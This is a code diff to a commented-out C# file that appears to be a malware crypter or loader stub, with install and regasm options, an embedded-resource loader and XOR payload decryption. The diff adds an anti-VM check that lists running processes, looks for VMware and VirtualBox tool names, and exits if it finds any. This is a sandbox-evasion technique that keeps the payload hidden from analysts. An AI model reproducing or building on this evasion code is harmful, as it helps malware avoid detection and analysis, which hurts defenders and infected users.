@@ -7,9 +7,11 @@
 ////#define ITSELF
 ////#define REGASM
 
+////#define ANTIVM
 ////#define SLEEP
 
 //using System;
+//using System.Collections.Generic;
 //using System.ComponentModel;
 //using System.Diagnostics;
 //using System.IO;
@@ -44,6 +46,10 @@
 //#endif
 //        public static void Main()
 //        {
+//#if ANTIVM
+//            if (AntiVM())
+//                Environment.Exit(0);
+//#endif
 //#if INSTALL
 //            Installer();
 //#endif
@@ -63,6 +69,7 @@
 //#endif
 //        }
 
+//        // Nyan x Cat - author of getresource
 //        public static byte[] GetResource(string file)
 //        {
 //            Assembly a = Assembly.GetExecutingAssembly();
@@ -124,6 +131,27 @@
 //                output[i] = (byte)(bytesToBeDecrypted[i] ^ key[i % key.Length]);
 //            }
 //            return output;
+//        }
+//#endif
+
+//#if ANTIVM
+//        private static bool AntiVM()
+//        {
+//            bool isInVM = false;
+
+//            // VMWare and VirtualBox process list
+//            List<string> proc = new List<string>()
+//            {
+//                "Vmtoolsd", "vboxservice","Vmwareuser","Vmwaretrat"
+//            };
+
+//            foreach (Process process in Process.GetProcesses())
+//            {
+//                if (proc.Contains(process.ProcessName))
+//                    isInVM = true;
+//            }
+
+//            return isInVM;
 //        }
 //#endif
 
